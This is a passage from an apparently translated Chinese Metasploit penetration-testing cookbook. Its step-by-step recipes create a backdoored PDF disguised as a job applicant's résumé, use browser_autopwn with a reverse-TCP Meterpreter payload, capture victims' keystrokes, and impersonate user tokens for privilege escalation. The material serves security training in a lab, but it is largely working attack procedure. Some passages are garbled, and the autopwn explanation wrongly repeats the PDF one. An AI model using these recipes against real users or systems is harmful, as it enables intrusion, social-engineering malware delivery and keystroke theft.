    目标是 Metasploitable 2 主机。我们首先启动控制台并搜索所有已知的 Tomcat 漏洞。在选择了 Tomcat 登录漏洞（它允许我们对 Tomcat
    登录进行暴力破解）后，我们设置了选项并执行了漏洞利用。Metasploit 会尝试进入两个文件中包含的所有用户名和密码的组合。在起的登录和密码组合旁找到 `+`
    符号。


    ## Metasploitable PDF


    在本教程中，我们将探索如何使用 Metasploit，通过 `Adobe PDF Embedded` 模块利用便携式文档格式 (PDF) 文档进行攻击。`Adobe
    PDF` 是用于向另一方传输文档的一种极被广泛使用的标准。由于其广泛的使用（特别是在业务用途中），我们将通过让用户认为他们正在打开一封来自求职者的合法 PDF
    文档来对用户的机器进行攻击。


    ### 准备工作


    需要满足以下要求：


    - 与内部网络建立连接

    - 在我们的黑客实验室中运行 Metasploitable

    - 用于执行字典攻击的字典列表


    ### 如何操作...


    让我们从打开终端窗口开始该过程：


    1. 打开终端窗口。

    2. 启动 `MSFCONSOLE`：


    ```

    msfconsole

    ```


    165

    ![](img/0015.jpeg)


    ### 漏洞利用


    3. 搜索所有可用的 PDF 模块：


    ```bash

    search pdf

    ```


    4. 使用 `Adobe PDF Embedded EXE Social Engineering`：


    ```bash

    use exploit/windows/fileformat/adobe_pdf_embedded_exe

    ```


    5. 显示模块的可用选项：


    ```bash

    show options

    ```


    166

    ![](img/00160.jpeg)


    第 6 章


    6. 设置我们要生成的 PDF 文件名：


    ```bash

    set FILENAME evildocument.pdf

    ```


    7. 设置 `INFILENAME` 选项。这是你有权使用的 PDF 文件的位置。在这种情况下，我正在使用位于桌面上的一个简历：


    ```bash

    set INFILENAME /root/Desktop/willie.pdf

    ```

    注意，该模块的所有选项都设置为可选，除 `INFILENAME` 选项外外。


    8. 运行漏洞利用：


    ```bash

    exploit

    ```


    ### 工作原理...


    在本教程中，我们使用 Metasploit 的 `MSFCONSOLE` 来利用并创建一个包含 `Meterpreter` 后门的 Adobe PDF 文件。我们首先启动控制台并搜索所有已知的
    PDF 漏洞。在选择了 `Embedded EXE PDF` 漏洞（它允许我们在合法的 PDF 中隐藏后门程序）后，我们设置了选项并执行了漏洞。Metasploit
    将生成一个带有 `Windows Reverse TCP Payload` 的 PDF。当你的目标打开 PDF 文件时，`Meterpreter` 将打开确认并激活会话。


    ## 实现 browser_autopwn


    Browser Autopwn 是 Metasploit 提供的一个辅助模块，它允许当受害者访问网页时简单地对目标机器进行自动化攻击。Browser Autopwn
    在攻击之前会对客户端进行指纹识别；这意味着它不会针对 Internet Explorer 7 浏览器尝试 Mozilla Firefox 漏洞。根据对浏览器的判断，它会决定部署哪种漏洞最佳。


    ### 准备工作


    需要连接到互联网或内部网络来完成本教程。


    167

    ![](img/00161.jpeg)


    ### 漏洞利用


    ### 如何操作...


    让我们从打开终端窗口开始：


    1. 打开终端窗口。

    2. 启动 `MSFCONSOLE`：


    ```bash

    msfconsole

    ```


    3. 搜索 `autopwn` 模块：


    ```bash

    Search autopwn

    ```


    4. 使用 `browser_autopwn` 模块：


    ```bash

    Use auxiliary/server/browser_autopwn

    ```


    5. 设置我们的负载荷。在这种情况下，我们使用 Windows Reverse TCP：


    ```bash

    set payload windows/meterpreter/reverse_tcp

    ```


    6. 显示此类负载荷的选项：


    ```bash

    show options

    ```


    7. 设置建立反连接的主机 IP 地址。在这种情况下，PC 的 IP 地址为 `192.168.10.109`：


    ```bash

    set LHOST 192.168.10.109

    ```


    8. 接下来，我们要设置 `URIPATH`。在这种情况下，我们使用 `"filetypes"`（带引号）：


    ```bash

    set URIPATH "filetypes"

    ```


    9. 最后，我们启动漏洞利用：


    ```bash

    exploit

    ```


    10. Metasploit 在 IP 地址 `http://[Provided IP Address]:8080` 启动漏洞利用。

    11. 当访问访问该地址时，`browser_autopwn` 模块尝试连接用户机器以建立远程会话。如果成功，`Meterpreter` 将确认会话。要激活会话，使用
    `session` 命令：


    ```bash

    session -I 1

    ```


    168

    ![](img/00162.jpeg)


    第 6 章


    12. 要显示我们可以运行的 `Meterpreter` 命令列表，输入 `help`：


    ```bash

    help

    ```


    13. 将显示可用命令列表。在这种情况下，我们启动：


    ```bash

    keys_start

    ```


    14. 要从受害者处获取击键记录，我们发布：


    ```bash

    keys_dump

    ```


    ### 工作原理...


    在本教程中，我们使用 Metasploit 的 `MSFCONSOLE` 利用并创建一个包含 `Meterpreter` 后门的 Adobe PDF 文件。我们首先启动控制台并搜索所有已知的
    PDF 漏洞。在选择了 `autopwn` 模块后，我们设置了负载荷 `windows_reverse_tcp`；如果利用成功，我们可以获取连接。当访问访问地址时，`Meterpreter`
    将确认会话。


    169


    ## 7 权限提升


    权限提升 (Escating Privileges)


    在本章中，我们将涵盖：


    - 使用令牌

    - 本地权限提升

    - 社交工程工具 (SET)

    - 收集受害者数据

    - 清理痕迹

    - 创建持久化后门

    - 人间中间 (MITM) 攻击


    ### 引言


    一旦我们访问了计算机，尽可能提升我们的权限很重要。通常我们获得低权限访问；在本章中我们将探索各种方法。


    使用令牌


    在本教程中，我们将模拟另一个用户。令牌包含登录信息并识别用户、组和权限。当用户登录系统时，他们会获得访问令牌。令牌模拟允许我们提升权限。


    ### 权限提升


    ### 准备工作


    执行此教程我们需要：


    - 连接到互联网或内网

    - 还需要目标机器


    ### 如何操作...


    我们从 `Meterpreter` shell 开始探索令牌。你必须使用 Metasploit 攻击主机以获取 `Meterpreter` shell。你可以使用第
    6 章漏洞利用中的任何一个教程来访问主机。


    1. 从 Meterpreter 我们通过使用 `incognito` 开始模拟过程：


    ```bash

    use incognito

    ```


    2. 通过发布 `help` 命令显示 `incognito` 的帮助：


    ```bash

    help

    ```


    3. 你会注意到有几个可用选项。

    4. 接下来我们要获取当前登录系统或最近访问系统的可用用户列表。我们通过执行带有 `-u` 选项的 `list_tokens` 命令来实现：


    ```bash

    list_tokens -u

    ```


    172

    ![](img/00164.jpeg)


    第 7 章


    5. 接下来，运行模拟攻击。使用 `impersonate_token` [要模拟的账户名称] 的语法为：


    ```bash

    impersonate_token \\willie-pc\willie

    ```


    6. 最后，运行 shell 命令。如果成功，我们现在以另一个用户的身份使用当前系统。



